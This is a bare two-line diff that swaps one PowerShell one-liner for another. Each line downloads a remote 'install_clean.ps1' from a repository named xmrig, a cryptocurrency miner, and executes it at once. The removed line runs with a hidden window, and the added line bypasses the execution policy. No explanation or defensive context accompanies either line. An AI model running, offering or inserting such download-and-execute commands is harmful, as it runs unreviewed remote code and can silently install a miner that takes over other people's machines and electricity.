@@ -1,1 +1,1 @@
-powershell -WindowStyle Hidden -Command "& {iex ((New-Object System.Net.WebClient).DownloadString('https://gitlab.com/Vicistar/xmrig/-/raw/main/install_clean.ps1'))}" 
+powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/Vicistar-V/xmrig/main/install_clean.ps1 | iex"
